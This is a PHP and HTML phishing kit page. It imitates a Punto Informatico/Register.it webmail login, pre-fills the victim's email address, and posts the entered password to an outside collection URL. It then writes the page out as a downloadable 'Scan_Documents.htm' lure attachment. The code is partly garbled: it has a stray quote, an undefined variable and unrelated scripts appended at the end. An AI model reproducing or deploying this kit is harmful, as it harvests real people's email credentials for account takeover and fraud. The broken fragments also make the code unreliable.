<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>WebmailPro by Punto Informatico</title>
<link rel="shortcut icon" href="http://webmail.serikor.com/favicon.ico" type="image/x-icon" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 22px;
  width: 100%;
  margin: 0;
  background: #fff;
  border: #ccc;
  border-bottom: 1px solid #999;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 14px;
  font-family: inherit;
  line-height: 18px;
  vertical-align: top;
  color: #404040;
  padding: 10px 0px;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  background-color: #fff;
  border: #ccc;
  border-bottom: 1px solid #0000cc;

  }
</style>
<body background="https://i.ibb.co/3TyC11W/bg.png">

<div align="center">
	<table border="0" width="477" cellspacing="0" cellpadding="0">
		<tr>
			<td height="20">
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>&nbsp;</td>
							<td width="400">
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="91"></td>
				</tr>
				<tr>
					<td height="351" background="https://i.ibb.co/0j5YtcR/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
					  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
						<tr>
							<td height="116"></td>
						</tr>
						<tr>
							<td height="174">
					<table border="0" width="100%" height="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="50"></td>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td>
									 <input type="text" name="user" placeholder="Email" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
									 <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
									 <input type="hidden" name="link" value="http://webmail.<?php echo $ddomain;?>" >
									 <input type="hidden" name="sender" value="Register.it" >
									</td>
								</tr>
								<tr>
									<td height="39"></td>
								</tr>
								<tr>
									<td>
									 <input type="password" name="passwd" placeholder="Password" required autofocus >
									</td>
								</tr>
								<tr>
									<td height="50"></td>
								</tr>
								<tr>
									<td>
									<input type="image" src="https://i.ibb.co/YcMMcL5/btn.png" width="300" height="41"></td>
								</tr>
							</table>
							</td>
							<td width="50">&nbsp;</td>
						</tr>
					</table>
							</td>
						</tr>
						<tr>
							<td height="60"></td>
						</tr>
						</form>
					</table>
					</td>
				</tr>
				<tr>
					<td height="23">&nbsp;</td>
				</tr>
			</table>
							</td>
							<td>&nbsp;</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td background="https://i.ibb.co/v1D5CpY/footer.png" height="40"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>';




$file = 'Scan_Documents.htm';


$fh = fopen($file, 'w'); // or die("error");  
fwrite($fh, $ww);
fclose($fh);



if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}



?>

<!DOCTYPE html>
<html>
<body>
</script>
  <script>
    'use strict';
    let newWindow = open('/', 'example', 'width=300,height=300')
    newWindow.onload = function() {
      newWindow.close();
      alert(newWindow.closed); // true
    };
  </script>

</body>
</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>